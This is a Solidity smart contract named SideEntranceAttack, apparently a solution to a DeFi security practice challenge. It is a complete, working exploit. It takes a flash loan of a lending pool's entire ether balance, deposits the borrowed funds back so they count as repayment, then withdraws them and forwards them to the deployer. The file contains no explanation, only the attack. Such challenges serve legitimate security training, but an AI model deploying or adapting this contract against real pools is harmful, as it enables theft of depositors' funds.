// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISideEntrance {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttack {
    ISideEntrance public pool;
    address attacker;

    constructor(ISideEntrance _pool){
        pool = ISideEntrance(_pool);
        attacker = msg.sender;
    }

    function attack() public {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        (bool sucess,) = attacker.call{value: amount}("");
        require(sucess, "transfer failed");
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable{}
}
